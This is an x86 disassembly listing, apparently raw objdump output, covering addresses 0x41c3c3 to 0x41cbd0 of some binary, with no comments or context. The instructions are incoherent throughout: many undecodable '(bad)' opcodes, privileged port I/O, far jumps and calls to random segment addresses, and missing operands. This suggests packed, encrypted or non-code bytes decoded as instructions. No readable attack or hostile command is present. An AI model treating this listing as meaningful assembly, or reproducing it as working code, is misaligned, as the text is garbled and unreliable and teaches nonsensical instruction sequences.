  41c3c3:	mov    ebx,0x3fd09bb6
  41c3c8:	fldcw  WORD PTR [edx-0x4bd4a469]
  41c3ce:	scas   eax,DWORD PTR es:[edi]
  41c3cf:	int    0x7a
  41c3d1:	jae    0x41c43c
  41c3d3:	and    DWORD PTR [esi-0x35],edx
  41c3d6:	adc    al,0x18
  41c3d8:	jb     0x41c3d9
  41c3da:	pop    eax
  41c3db:	add    BYTE PTR [esi-0x754f5ea7],bl
  41c3e1:	xor    dh,BYTE PTR [eax+ecx*2-0x5f36d700]
  41c3e8:	push   0x3525c5b9
  41c3ed:	mov    ebx,DWORD PTR [ebp-0x363eef43]
  41c3f3:	mov    cs,WORD PTR [edx+0x78aaaf07]
  41c3f9:	sti    
  41c3fa:	shr    bh,1
  41c3fc:	lock fnsave ds:0x2dca17a1
  41c403:	jmp    0xa43:0xb38609b6
  41c40a:	imul   edi,DWORD PTR [eax-0x6964cf47],0xffffffff
  41c411:	mov    bl,0x5b
  41c413:	(bad)  [edi+0x46cd34b2]
  41c419:	arpl   sp,ax
  41c41b:	sub    BYTE PTR [eax+0x59eec21d],bl
  41c421:	in     eax,dx
  41c422:	mov    edx,0x7d4a8055
  41c427:	aam    0xe7
  41c429:	xor    ch,bl
  41c42b:	jle    0x41c456
  41c42d:	mov    edi,0x2e45cf04
  41c432:	sahf   
  41c433:	pop    ds
  41c434:	jmp    0x8ef875c4
  41c439:	jns    0x41c416
  41c43b:	jo     0x41c3d5
  41c43d:	shl    DWORD PTR [ebx],1
  41c43f:	adc    BYTE PTR [ebx-0x6],0xf9
  41c443:	adc    eax,0x85b38115
  41c448:	out    0xdb,al
  41c44a:	xchg   esi,eax
  41c44b:	jbe    0x41c3de
  41c44d:	jl     0x41c40c
  41c44f:	mov    eax,0xbd178c2c
  41c454:	push   cs
  41c455:	fmul   DWORD PTR [ebx-0x521e78ff]
  41c45b:	pop    ebp
  41c45c:	shl    BYTE PTR [esi-0x31a8402d],0xd9
  41c463:	sbb    eax,0xb12d69e5
  41c468:	cmc    
  41c469:	call   0x3554:0x7153154f
  41c470:	sbb    eax,0x7aab22c8
  41c475:	xchg   edx,eax
  41c476:	(bad)  
  41c477:	cmp    al,0x1d
  41c479:	mov    eax,0xcbfb00b
  41c47e:	xchg   ebx,eax
  41c47f:	and    dh,BYTE PTR [ecx+esi*2+0x3a]
  41c483:	and    ch,BYTE PTR [eax]
  41c485:	add    cl,BYTE PTR [esi+ecx*1-0x129eade3]
  41c48c:	sub    al,0x18
  41c48e:	jae    0x41c4b2
  41c490:	or     eax,0x96bf6dc0
  41c495:	mov    WORD PTR [ebx+0x5a],es
	...
  41c513:	add    BYTE PTR [esi-0x9b72fa0],al
  41c519:	clc    
  41c51a:	sahf   
  41c51b:	out    dx,al
  41c51c:	or     eax,0xa6b0d536
  41c521:	and    BYTE PTR [edx-0x63],ah
  41c524:	test   DWORD PTR [edx+0x1],esp
  41c527:	add    BYTE PTR [edi+eax*1+0x0],ch
  41c52b:	add    BYTE PTR [esi-0x44a7b257],ch
  41c531:	inc    ecx
  41c532:	in     al,dx
  41c533:	sahf   
  41c534:	pop    edi
  41c535:	lock mov ds:0x7369207a,al
  41c53b:	jbe    0x41c4cd
  41c53d:	sahf   
  41c53e:	test   BYTE PTR [edx+0x32],cl
  41c541:	sar    BYTE PTR [edi+esi*8-0x2f9edc92],1
  41c548:	cmp    dh,al
  41c54a:	add    eax,0xf935d483
  41c54f:	xchg   edx,eax
  41c550:	mov    cl,0xb2
  41c552:	iret   
  41c553:	loopne 0x41c52f
  41c555:	(bad)  
  41c557:	jmp    0xc65a:0x71869cc
  41c55e:	mov    es,esi
  41c560:	mov    ecx,0x583fb5c4
  41c565:	addr16 mov esp,0x7e862c43
  41c56b:	addr16 push ebp
  41c56d:	push   ds
  41c56e:	fwait
  41c56f:	in     al,0x47
  41c571:	mov    DWORD PTR [ecx],0x13b8bf61
  41c577:	mov    bh,0xd8
  41c579:	lds    edx,FWORD PTR ss:[ecx]
  41c57c:	icebp  
  41c57d:	(bad)  
  41c57e:	sub    al,0xe0
  41c580:	sti    
  41c581:	sti    
  41c582:	mov    dh,0xb5
  41c584:	push   esi
  41c585:	or     ebp,DWORD PTR [ebx]
  41c587:	popa   
  41c588:	or     dh,BYTE PTR [ebp+edx*8-0x2]
  41c58c:	pop    esi
  41c58d:	push   esp
  41c58f:	jns    0x41c5a2
  41c591:	jmp    0x41c561
  41c593:	bound  ecx,QWORD PTR [ecx-0x3a6b2dd4]
  41c599:	and    edx,DWORD PTR [ebp+0x2bb6eb11]
  41c59f:	push   edi
  41c5a0:	movsx  edx,bh
  41c5a3:	push   0xfffffff2
  41c5a5:	nop
  41c5a6:	ror    DWORD PTR [ebx+ecx*4-0x6c3f2800],0xdd
  41c5ae:	(bad)  
  41c5b0:	mov    cl,BYTE PTR [edx+0x6]
  41c5b3:	out    dx,eax
  41c5b4:	out    0xaa,eax
  41c5b6:	es leave 
  41c5b8:	hlt    
  41c5b9:	pop    eax
  41c5ba:	push   esi
  41c5bb:	jno    0x41c5fa
  41c5bd:	inc    esp
  41c5be:	into   
  41c5bf:	mov    ebp,0x328fb624
  41c5c4:	cmp    ebx,0x87e244bb
  41c5ca:	enter  0xa328,0x9
  41c5ce:	(bad)  
  41c5cf:	cmc    
  41c5d0:	loope  0x41c5e0
  41c5d2:	push   0xffffffb4
  41c5d4:	aas    
  41c5d5:	adc    DWORD PTR [esi],ebx
  41c5d7:	xchg   BYTE PTR ds:0x92a73889,bl
  41c5dd:	inc    ecx
  41c5de:	push   cs
  41c5df:	or     esi,DWORD PTR ds:0xbde71348
  41c5e5:	mov    ds:0x28d8b69b,al
  41c5ea:	and    DWORD PTR [edx+0x111ae624],edi
  41c5f0:	repz cmc 
  41c5f2:	sbb    bh,BYTE PTR [ebp-0x7f]
  41c5f5:	icebp  
  41c5f6:	in     al,dx
  41c5f7:	or     DWORD PTR [esi],ebx
  41c5f9:	push   0xffffff91
  41c5fb:	mov    ch,0xbe
  41c5fd:	ds ja  0x41c667
  41c600:	mov    esp,0x8ca12c7a
  41c605:	(bad)  
  41c606:	mov    BYTE PTR ds:[edi],ah
  41c609:	sub    ch,dl
  41c60b:	arpl   WORD PTR [edx],bp
  41c60d:	sbb    esp,DWORD PTR [ebx+0x637e085b]
  41c613:	shl    BYTE PTR [ebp-0x3c2582c8],cl
  41c619:	js     0x41c614
  41c61b:	bound  ecx,QWORD PTR [ebx-0x6f971b85]
  41c621:	gs cmp bl,0x62
  41c625:	je     0x41c650
  41c627:	xchg   edx,eax
  41c628:	mov    ds:0x2abd7347,eax
  41c62d:	and    ch,ch
  41c62f:	ss push 0x23c512bd
  41c635:	shr    DWORD PTR [esi+eax*2+0x7d],0x58
  41c63a:	mov    eax,0x8bac14f9
  41c63f:	jb     0x41c644
  41c641:	mov    bl,0x3c
  41c643:	sbb    esp,DWORD PTR [eax]
  41c645:	imul   ecx,DWORD PTR [ebx+edi*1+0x3911052b],0x18f21247
  41c650:	shl    BYTE PTR [ecx+0xc],1
  41c653:	(bad)  
  41c654:	arpl   WORD PTR ds:0xfe0c8bde,bx
  41c65a:	mov    eax,0x843091c1
  41c65f:	sahf   
  41c660:	sub    DWORD PTR [ecx-0x34],ebp
  41c663:	and    ecx,ebp
  41c665:	dec    ebx
  41c666:	enter  0xbda2,0x5
  41c66a:	adc    eax,0x2d11c665
  41c66f:	xor    eax,0x58b3111f
  41c674:	not    BYTE PTR [ecx]
  41c676:	sub    DWORD PTR [edx+ecx*2],edx
  41c679:	sahf   
  41c67a:	sar    BYTE PTR [ebp+0x24],0x9a
  41c67e:	(bad)  [eax-0x6]
  41c681:	or     al,0x16
  41c683:	push   es
  41c684:	mov    WORD PTR [ebp-0x26257f08],es
  41c68a:	es push 0xffffff87
  41c68d:	sar    DWORD PTR [ebx-0x25],1
  41c690:	sub    al,0xb4
  41c692:	in     eax,dx
  41c693:	pop    edi
  41c694:	idiv   BYTE PTR [edi]
  41c696:	adc    edx,ebp
  41c698:	inc    ebp
  41c699:	mov    esi,0x76efd8de
  41c69e:	std    
  41c69f:	repz mov esp,DWORD PTR [edi+0x14f50cec]
  41c6a6:	and    cl,BYTE PTR [edi]
  41c6a8:	pop    ebx
  41c6a9:	and    ebx,0x57
  41c6ac:	in     al,0x51
  41c6ae:	fimul  DWORD PTR [ecx]
  41c6b0:	jbe    0x41c6c2
  41c6b2:	fisubr DWORD PTR [eax-0x63b0d5ed]
  41c6b8:	mov    ebp,0x7daf1315
  41c6bd:	pusha  
  41c6be:	pop    edx
  41c6bf:	pusha  
  41c6c0:	mov    dl,0x68
  41c6c2:	push   ss
  41c6c3:	mov    al,ds:0xf87eac22
  41c6c8:	pop    ss
  41c6c9:	mov    ebx,fs
  41c6cb:	pop    ss
  41c6cc:	jo     0x41c6ea
  41c6ce:	push   0x9582b561
  41c6d3:	push   ecx
  41c6d4:	sbb    dl,ah
  41c6d6:	imul   ecx,ebp,0x20
  41c6d9:	stc    
  41c6da:	or     ecx,DWORD PTR [eax-0x79]
  41c6dd:	or     BYTE PTR [ebp+0x24],0xc3
  41c6e1:	xor    ebp,0x3eaf7009
  41c6e7:	gs mov eax,0xa83f5141
  41c6ed:	repz push es
  41c6ef:	add    eax,0xdf139c16
  41c6f4:	(bad)  [ebp-0x21]
  41c6f7:	cdq    
  41c6f8:	lods   al,BYTE PTR ds:[esi]
  41c6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6fa:	add    al,0x7b
  41c6fc:	fdiv   DWORD PTR [ebp+0x61]
  41c6ff:	scas   eax,DWORD PTR es:[edi]
  41c700:	retf   0x1fe6
  41c703:	(bad)  
  41c704:	fs push esp
  41c706:	mov    eax,0x9e146a8e
  41c70b:	xchg   ebx,eax
  41c70c:	mov    WORD PTR [edx-0x6f],gs
  41c70f:	or     BYTE PTR [esi+ebx*8-0x33fae0fb],dl
  41c716:	pushf  
  41c717:	jno    0x41c73a
  41c719:	mov    cl,0xe8
  41c71b:	loopne 0x41c778
  41c71d:	call   0x5c2c:0x9012f7ab
  41c724:	out    0x83,eax
  41c726:	lahf   
  41c727:	cmc    
  41c728:	mov    bh,0x25
  41c72a:	icebp  
  41c72b:	cmp    al,0x4f
  41c72d:	nop
  41c72e:	idiv   BYTE PTR [esi+0x24]
  41c731:	jge    0x41c6d0
  41c733:	mov    dh,0xc8
  41c735:	hlt    
  41c736:	stos   DWORD PTR es:[edi],eax
  41c737:	enter  0x98ee,0x76
  41c73b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c73c:	mov    ds,edi
  41c73e:	mov    ds:0x8b35faaf,al
  41c743:	jnp    0x41c759
  41c745:	enter  0x8f6d,0xf9
  41c749:	pop    edi
  41c74a:	jle    0x41c78e
  41c74c:	fmul   DWORD PTR [esi]
  41c74e:	push   0xffffffe5
  41c750:	aad    0x70
  41c752:	add    al,0x87
  41c754:	adc    ch,ch
  41c756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c757:	data16 js 0x41c74f
  41c75a:	lods   al,BYTE PTR ds:[esi]
  41c75b:	add    eax,0x9dc887b3
  41c760:	mov    dh,0xd9
  41c762:	inc    eax
  41c763:	pop    edx
  41c764:	inc    BYTE PTR [ebx+0x1b]
  41c767:	push   ebp
  41c768:	mov    eax,0x1b332f51
  41c76d:	xor    ebp,DWORD PTR [ebp+0x5f]
  41c770:	fst    QWORD PTR [esi-0x14]
  41c773:	pop    ebx
  41c774:	jno    0x41c77f
  41c776:	add    DWORD PTR [esi],ebx
  41c778:	xchg   esp,eax
  41c779:	pop    es
  41c77a:	popf   
  41c77b:	inc    esp
  41c77c:	out    0x4,eax
  41c77e:	jge    0x41c7d7
  41c780:	in     eax,dx
  41c781:	mov    cl,0xac
  41c783:	mov    ebx,DWORD PTR [ecx+0x7b3eebfe]
  41c789:	cmc    
  41c78a:	pop    es
  41c78b:	ins    DWORD PTR es:[edi],dx
  41c78c:	jle    0x41c788
  41c78e:	test   eax,0x9385afa2
  41c793:	cmp    al,0x71
  41c795:	push   ecx
  41c796:	add    BYTE PTR [esi+0x76],dh
  41c799:	push   esp
  41c79a:	jmp    0xef59144f
  41c79f:	cwde   
  41c7a0:	and    ebx,edx
  41c7a2:	sbb    DWORD PTR [ecx],edx
  41c7a4:	aaa    
  41c7a5:	ret    
  41c7a6:	pop    ebp
  41c7a7:	hlt    
  41c7a8:	nop
  41c7a9:	dec    esi
  41c7aa:	out    0x9f,eax
  41c7ac:	test   esp,0x72a0a6d6
  41c7b2:	mov    edi,0x6cd83828
  41c7b7:	cmp    eax,0xfe13b719
  41c7bc:	aad    0x5c
  41c7be:	addr16 jp 0x41c785
  41c7c1:	nop
  41c7c2:	pop    es
  41c7c3:	sub    al,0x2
  41c7c5:	xchg   ecx,eax
  41c7c6:	loope  0x41c80d
  41c7c8:	ins    DWORD PTR es:[edi],dx
  41c7c9:	sub    BYTE PTR [ecx],bl
  41c7cb:	xchg   ebx,eax
  41c7cc:	xor    al,0x41
  41c7ce:	imul   ebx,DWORD PTR [ebp+0x4e],0xb07bd3c2
  41c7d5:	push   es
  41c7d6:	iret   
  41c7d7:	pop    ds
  41c7d8:	pop    ebx
  41c7d9:	ds popf 
  41c7db:	iret   
  41c7dc:	xor    eax,edi
  41c7de:	pop    edi
  41c7df:	add    DWORD PTR [esi+0x228a565a],esi
  41c7e5:	pushf  
  41c7e6:	sub    BYTE PTR [edi-0x41],bl
  41c7e9:	or     al,0xe0
  41c7eb:	xchg   esp,eax
  41c7ec:	rcr    BYTE PTR [ebx+0x5b9944c2],0x42
  41c7f3:	cdq    
  41c7f4:	pop    edx
  41c7f5:	std    
  41c7f6:	mov    WORD PTR [esi+ecx*2+0x52],?
  41c7fa:	stos   BYTE PTR es:[edi],al
  41c7fb:	scas   al,BYTE PTR es:[edi]
  41c7fc:	retf   0x802e
  41c7ff:	loop   0x41c83b
  41c801:	gs xor al,0xb
  41c804:	mov    ds:0xb3d185c,eax
  41c809:	(bad)  
  41c80a:	nop
  41c80b:	adc    esi,edi
  41c80d:	xlat   BYTE PTR ds:[ebx]
  41c80e:	pop    ebx
  41c80f:	inc    ebx
  41c810:	sub    dh,BYTE PTR [ebx]
  41c812:	pop    esp
  41c813:	aad    0x7c
  41c815:	test   BYTE PTR [edx+0x30d6918f],ch
  41c81b:	scas   eax,DWORD PTR es:[edi]
  41c81c:	xor    esp,DWORD PTR [esi+0x77]
  41c81f:	in     al,0xa8
  41c821:	lea    esi,[ecx]
  41c823:	jp     0x41c86b
  41c825:	in     al,0x5a
  41c827:	(bad)  
  41c828:	outs   dx,DWORD PTR ds:[esi]
  41c829:	ss scas al,BYTE PTR es:[edi]
  41c82b:	rcl    BYTE PTR [edx+0x337586ad],1
  41c831:	rcr    BYTE PTR [eax+eiz*2],1
  41c834:	xchg   esp,eax
  41c835:	mov    dh,0x43
  41c837:	std    
  41c838:	push   edx
  41c839:	ins    BYTE PTR es:[edi],dx
  41c83a:	jecxz  0x41c836
  41c83c:	clc    
  41c83d:	fwait
  41c83e:	add    BYTE PTR [ebp+0x39],0x94
  41c842:	in     al,0x31
  41c844:	enter  0x224c,0x5
  41c848:	faddp  st(1),st
  41c84a:	mov    ch,0xc2
  41c84c:	call   0xdb1c4a7a
  41c851:	pop    ebx
  41c852:	xchg   esi,eax
  41c853:	enter  0x3da4,0x5c
  41c857:	push   ds
  41c858:	xchg   BYTE PTR [edi],cl
  41c85a:	mov    ch,BYTE PTR [edx+0x8f9689d]
  41c860:	ret    
  41c861:	inc    ebp
  41c862:	mov    bl,0xb5
  41c864:	out    dx,al
  41c865:	or     ch,BYTE PTR [eax]
  41c867:	in     eax,0x7f
  41c869:	inc    ebp
  41c86a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c86b:	dec    edi
  41c86c:	int3   
  41c86d:	pushf  
  41c86e:	inc    eax
  41c86f:	mov    eax,esi
  41c871:	xchg   esp,eax
  41c872:	mov    BYTE PTR [esi-0x4dd65746],bh
  41c878:	push   esi
  41c879:	int    0xee
  41c87b:	inc    DWORD PTR [ebx]
  41c87d:	cmp    al,0xb6
  41c87f:	mov    dh,0x3c
  41c881:	ins    DWORD PTR es:[edi],dx
  41c882:	lahf   
  41c883:	push   0xb6cbddee
  41c888:	pop    DWORD PTR [ecx+eax*2-0x60dc39b5]
  41c88f:	dec    esi
  41c890:	fldcw  WORD PTR [edx]
  41c892:	jae    0x41c8ce
  41c894:	mov    ch,0x9c
  41c896:	lods   al,BYTE PTR ds:[esi]
  41c897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c898:	pop    ecx
  41c899:	jl     0x41c85c
  41c89b:	arpl   WORD PTR [edx],sp
  41c89d:	or     ah,BYTE PTR [esi+0x1cef1d7c]
  41c8a3:	xor    al,0x34
  41c8a5:	cld    
  41c8a6:	mul    ecx
  41c8a8:	adc    ah,BYTE PTR [eax-0x67]
  41c8ab:	dec    eax
  41c8ac:	inc    ebx
  41c8ad:	data16 jbe 0x41c8c9
  41c8b0:	cmp    DWORD PTR [esi-0x150c2a44],eax
  41c8b6:	fcmovb st,st(7)
  41c8b8:	into   
  41c8b9:	jecxz  0x41c8ee
  41c8bb:	in     al,dx
  41c8bc:	out    0xac,eax
  41c8be:	inc    ebp
  41c8bf:	dec    ecx
  41c8c0:	and    esi,eax
  41c8c2:	or     ecx,DWORD PTR [esi-0x80]
  41c8c5:	sbb    al,0x59
  41c8c7:	cmp    DWORD PTR [edi-0x21],ecx
  41c8ca:	pop    es
  41c8cb:	mov    cl,0x87
  41c8cd:	add    dl,dl
  41c8cf:	pop    ds
  41c8d0:	enter  0xf933,0x47
  41c8d4:	test   eax,0x7598c034
  41c8d9:	sub    eax,edi
  41c8db:	and    dh,BYTE PTR [ebp-0xf718088]
  41c8e1:	sub    edi,DWORD PTR [esi+0x4b]
  41c8e4:	mov    ds:0x835adde9,eax
  41c8e9:	(bad)  
  41c8ea:	sbb    bl,cl
  41c8ec:	add    BYTE PTR [ecx+0x1324de94],0x6c
  41c8f3:	dec    eax
  41c8f4:	lods   eax,DWORD PTR ds:[esi]
  41c8f5:	inc    edx
  41c8f6:	mul    dh
  41c8f8:	fisttp QWORD PTR ds:0x3963a71f
  41c8fe:	int3   
  41c8ff:	xchg   edx,eax
  41c900:	adc    ecx,esi
  41c902:	mov    dh,0x1e
  41c904:	mov    dh,0x11
  41c906:	icebp  
  41c907:	js     0x41c97c
  41c909:	aas    
  41c90a:	(bad)  
  41c90b:	push   eax
  41c90c:	retf   0x7083
  41c90f:	cli    
  41c910:	push   ds
  41c911:	out    0x95,al
  41c913:	or     edi,DWORD PTR [edi-0x20]
  41c916:	fsubr  QWORD PTR [ebp-0x45]
  41c919:	shl    BYTE PTR gs:[ebp+0x21c1ce21],cl
  41c920:	movaps XMMWORD PTR [eax+0x29786f42],xmm2
  41c927:	addr16 xchg edi,eax
  41c929:	out    0xca,eax
  41c92b:	rcr    DWORD PTR [edi-0x42],1
  41c92e:	adc    DWORD PTR [eax],ebx
  41c930:	out    0x4c,al
  41c932:	dec    ebp
  41c933:	shr    DWORD PTR [edx+0x7e],1
  41c936:	xor    BYTE PTR ss:[edx],0xa4
  41c93a:	scas   al,BYTE PTR es:[edi]
  41c93b:	or     ah,bl
  41c93d:	fimul  WORD PTR [edi-0x2a8882fb]
  41c943:	stos   DWORD PTR es:[edi],eax
  41c944:	push   cs
  41c945:	js     0x41c95e
  41c947:	xor    eax,0x74a62f07
  41c94c:	enter  0x7850,0x4c
  41c950:	mov    bl,0x1c
  41c952:	scas   al,BYTE PTR es:[edi]
  41c953:	sub    bh,BYTE PTR [eax-0x6fa871f]
  41c959:	sub    BYTE PTR [ebx+0x40],cl
  41c95c:	cwde   
  41c95d:	mov    ds:0x8ded1f0c,al
  41c962:	icebp  
  41c963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c964:	dec    eax
  41c965:	or     eax,0x401b24ab
  41c96a:	inc    ecx
  41c96b:	test   BYTE PTR [ebx+0x1a],bh
  41c96e:	shr    BYTE PTR [ebx-0x65ec4b1],0x68
  41c975:	mov    edx,0xadda8470
  41c97a:	std    
  41c97b:	dec    edi
  41c97c:	adc    DWORD PTR [ebx],edi
  41c97e:	jno    0x41c97d
  41c980:	jl     0x41c999
  41c982:	mul    BYTE PTR [ebp+0x1d]
  41c985:	das    
  41c986:	xchg   esp,eax
  41c987:	imul   edx,ecx,0x15066c21
  41c98d:	push   cs
  41c98e:	inc    ebp
  41c98f:	imul   ebp,DWORD PTR ds:0x4daac74e,0x69b3398f
  41c999:	sahf   
  41c99a:	lods   al,BYTE PTR ds:[esi]
  41c99b:	mov    al,0x11
  41c99d:	mov    WORD PTR [ebp+0x14],?
  41c9a0:	test   BYTE PTR [ebp+0x6ad0e038],bh
  41c9a6:	into   
  41c9a7:	xchg   DWORD PTR [edx],esi
  41c9a9:	dec    esp
  41c9aa:	inc    esi
  41c9ab:	xor    al,0x11
  41c9ad:	bound  esi,QWORD PTR [edi-0x24d0e12c]
  41c9b3:	addr16 sbb eax,0x9313d6d2
  41c9b9:	xor    dh,BYTE PTR [esi]
  41c9bb:	inc    ecx
  41c9bc:	jns    0x41c9e3
  41c9be:	cld    
  41c9bf:	and    ebp,DWORD PTR [edi+ecx*4-0x7f1cd854]
  41c9c6:	sub    eax,0x937cb87f
  41c9cb:	test   eax,0xa5c16042
  41c9d0:	push   esp
  41c9d1:	jae    0x41c9c4
  41c9d3:	(bad)  
  41c9d5:	ins    DWORD PTR es:[edi],dx
  41c9d6:	out    0xc8,al
  41c9d8:	dec    esp
  41c9d9:	pop    ss
  41c9da:	push   ebx
  41c9db:	mov    ah,0x69
  41c9dd:	mov    eax,ds:0xb1913dbb
  41c9e2:	xchg   ah,dl
  41c9e4:	pop    es
  41c9e5:	and    edi,DWORD PTR [edi-0xb360565]
  41c9eb:	xor    BYTE PTR [eax+0x77227b5c],0xb0
  41c9f2:	icebp  
  41c9f3:	addr16 inc esi
  41c9f5:	fisttp QWORD PTR [ecx-0x3f]
  41c9f8:	pop    esi
  41c9f9:	fwait
  41c9fa:	out    0x67,al
  41c9fc:	xor    al,BYTE PTR [esp+esi*8+0x78]
  41ca00:	test   bl,0xe2
  41ca03:	mov    ebx,0x9eeda276
  41ca08:	loopne 0x41c995
  41ca0a:	inc    ebp
  41ca0b:	xor    bh,dl
  41ca0d:	mov    esp,0xa87d50c8
  41ca12:	mov    eax,ds:0x7f44310
  41ca17:	xchg   esp,eax
  41ca18:	push   edi
  41ca19:	outs   dx,DWORD PTR ds:[esi]
  41ca1a:	pop    ecx
  41ca1b:	call   0xbf20:0xc961b864
  41ca22:	out    dx,eax
  41ca23:	dec    edx
  41ca24:	push   eax
  41ca25:	pop    ebp
  41ca26:	sub    edi,DWORD PTR [edi-0x3b]
  41ca29:	inc    ecx
  41ca2a:	xchg   esp,eax
  41ca2b:	mov    eax,0xe86929c2
  41ca30:	out    dx,al
  41ca31:	fwait
  41ca32:	pop    ds
  41ca33:	arpl   bp,ax
  41ca35:	mov    edx,0xbfb1b2b4
  41ca3a:	(bad)  
  41ca3b:	int    0x3a
  41ca3d:	lods   al,BYTE PTR ds:[esi]
  41ca3e:	ins    BYTE PTR es:[edi],dx
  41ca3f:	push   ds
  41ca40:	xchg   dh,dl
  41ca42:	popa   
  41ca43:	fwait
  41ca44:	push   es
  41ca45:	(bad)  
  41ca46:	stos   DWORD PTR es:[edi],eax
  41ca47:	xchg   edx,eax
  41ca48:	mov    bl,0x91
  41ca4a:	pop    eax
  41ca4b:	mov    ds:0x3b73b412,eax
  41ca50:	jne    0x41ca45
  41ca52:	sub    eax,0x74448c8
  41ca57:	mov    WORD PTR [edx-0x4],?
  41ca5a:	jg     0x41ca7d
  41ca5c:	stc    
  41ca5d:	scas   eax,DWORD PTR es:[edi]
  41ca5e:	inc    esi
  41ca5f:	cmp    eax,0xc600db22
  41ca64:	sbb    al,0x14
  41ca66:	test   BYTE PTR [edx],dl
  41ca68:	jne    0x41ca27
  41ca6a:	lods   eax,DWORD PTR ds:[esi]
  41ca6b:	jb     0x41cab7
  41ca6d:	inc    ebp
  41ca6e:	fidiv  WORD PTR ds:0x2a4a9b73
  41ca74:	jle    0x41ca86
  41ca76:	and    ch,BYTE PTR [esi]
  41ca78:	add    ebp,ebx
  41ca7a:	adc    BYTE PTR [ebx+0x15d31a76],0xf
  41ca81:	into   
  41ca82:	and    BYTE PTR ss:[ecx-0x31],dh
  41ca86:	inc    ebx
  41ca87:	mov    DWORD PTR [ecx-0x27],esp
  41ca8a:	outs   dx,BYTE PTR ds:[esi]
  41ca8b:	add    ah,BYTE PTR [edi]
  41ca8d:	jecxz  0x41caec
  41ca8f:	cmp    edi,ebp
  41ca91:	dec    edi
  41ca92:	loop   0x41ca35
  41ca94:	and    eax,ecx
  41ca96:	jg     0x41ca60
  41ca98:	nop
  41ca99:	ins    DWORD PTR es:[edi],dx
  41ca9a:	pop    edx
  41ca9b:	pop    edi
  41ca9c:	cmp    DWORD PTR [edi],0x6f037223
  41caa2:	xchg   esp,eax
  41caa3:	pop    ebx
  41caa4:	popa   
  41caa5:	dec    edi
  41caa6:	xor    al,0xa5
  41caa8:	cmp    eax,DWORD PTR [ebp-0x36ca821b]
  41caae:	scas   al,BYTE PTR es:[edi]
  41caaf:	sahf   
  41cab0:	call   0x6aecedc1
  41cab5:	(bad)  
  41cab6:	push   ss
  41cab7:	cmp    eax,0x5d0e46fb
  41cabc:	(bad)  [edi+0x5f]
  41cabf:	push   esp
  41cac0:	inc    edi
  41cac1:	and    cl,BYTE PTR [ecx-0x76]
  41cac4:	or     al,0xbc
  41cac6:	cmp    esi,DWORD PTR [ebx]
  41cac8:	enter  0xa940,0xc7
  41cacc:	les    eax,FWORD PTR ds:0xfb4d19cf
  41cad2:	out    0xde,al
  41cad4:	jle    0x41cae9
  41cad6:	hlt    
  41cad7:	xchg   BYTE PTR [ebx-0x14556afc],bh
  41cadd:	cmp    BYTE PTR [ebp-0x788ccfca],bh
  41cae3:	mov    al,ds:0x8377e247
  41cae8:	int    0xd9
  41caea:	(bad)  
  41caeb:	std    
  41caec:	(bad)  
  41caee:	iret   
  41caef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf0:	div    esp
  41caf2:	mov    esp,0xb8529206
  41caf7:	sbb    eax,0x16d30655
  41cafc:	sbb    cl,BYTE PTR [ecx]
  41cafe:	ret    
  41caff:	shr    BYTE PTR [eax-0x24],cl
  41cb02:	scas   al,BYTE PTR es:[edi]
  41cb03:	add    dh,BYTE PTR [edx+0x4c]
  41cb06:	sub    dl,BYTE PTR [esi-0x8b54206]
  41cb0c:	fldcw  WORD PTR [ebp-0x4d7aef1]
  41cb12:	jl     0x41cb7e
  41cb14:	aad    0x5d
  41cb16:	xor    esp,DWORD PTR [ecx+0x27]
  41cb19:	ins    DWORD PTR es:[edi],dx
  41cb1a:	ds dec edi
  41cb1c:	sub    ebx,eax
  41cb1e:	test   BYTE PTR [edi+0x3d],dl
  41cb21:	int3   
  41cb22:	outs   dx,BYTE PTR ds:[esi]
  41cb23:	call   0xf5fbd796
  41cb28:	loop   0x41caba
  41cb2a:	aad    0xa5
  41cb2c:	and    ch,dl
  41cb2e:	add    al,0xfe
  41cb30:	add    edi,DWORD PTR ds:[esi+esi*1]
  41cb34:	and    ah,cl
  41cb36:	pop    esi
  41cb37:	sti    
  41cb38:	daa    
  41cb39:	jmp    0x41cabf
  41cb3b:	sbb    al,0xa0
  41cb3d:	rol    BYTE PTR [ecx+0x49],1
  41cb40:	mov    eax,ds:0x25e93923
  41cb45:	sbb    DWORD PTR [ebp+0x20],ecx
  41cb48:	adc    dh,bh
  41cb4a:	and    esp,DWORD PTR [edi]
  41cb4c:	push   edi
  41cb4d:	push   ecx
  41cb4e:	out    0xe8,al
  41cb50:	sub    esp,eax
  41cb52:	lock in eax,0x26
  41cb55:	addr16 xor al,0x6a
  41cb58:	push   ds
  41cb59:	push   esi
  41cb5a:	jmp    0x41cbd9
  41cb5c:	add    eax,0x33cb1583
  41cb61:	es fwait
  41cb63:	stos   DWORD PTR es:[edi],eax
  41cb64:	xor    BYTE PTR [ebx+edi*1],bh
  41cb67:	es mov edx,0xa7085b55
  41cb6d:	mov    cl,0xb9
  41cb6f:	data16 mov al,ds:0x8de6c44d
  41cb75:	adc    BYTE PTR [edx+0x35ddbffe],al
  41cb7b:	pusha  
  41cb7c:	add    ebp,DWORD PTR [ebx-0x2e3cd1a4]
  41cb82:	dec    eax
  41cb83:	jmp    0x12f3:0xae177eaa
  41cb8a:	dec    eax
  41cb8b:	mov    dl,0xed
  41cb8d:	ins    DWORD PTR es:[edi],dx
  41cb8e:	ss int 0x57
  41cb91:	add    cl,BYTE PTR gs:[edx-0xd677d2]
  41cb98:	cwde   
  41cb99:	test   eax,0xd079a578
  41cb9e:	adc    ebx,0x587aa062
  41cba4:	mov    dl,0x6e
  41cba6:	scas   eax,DWORD PTR es:[edi]
  41cba7:	and    DWORD PTR [ebx-0x62],eax
  41cbaa:	call   0xa4ed:0xbd302f8f
  41cbb1:	push   ss
  41cbb2:	test   DWORD PTR [ebx+ecx*1+0x37],esp
  41cbb6:	xchg   esi,eax
  41cbb7:	hlt    
  41cbb8:	push   es
  41cbb9:	imul   ebx,DWORD PTR [edx+0x3ddfd6c],0x63
  41cbc0:	add    al,0x3a
  41cbc2:	test   DWORD PTR [ebx],eax
  41cbc4:	sbb    DWORD PTR [ecx+0x5b],0x6
  41cbc8:	lock add DWORD PTR [edx+0x2677a29a],edi
  41cbcf:	lahf   
  41cbd0:	mov    ecx,0x980115e4
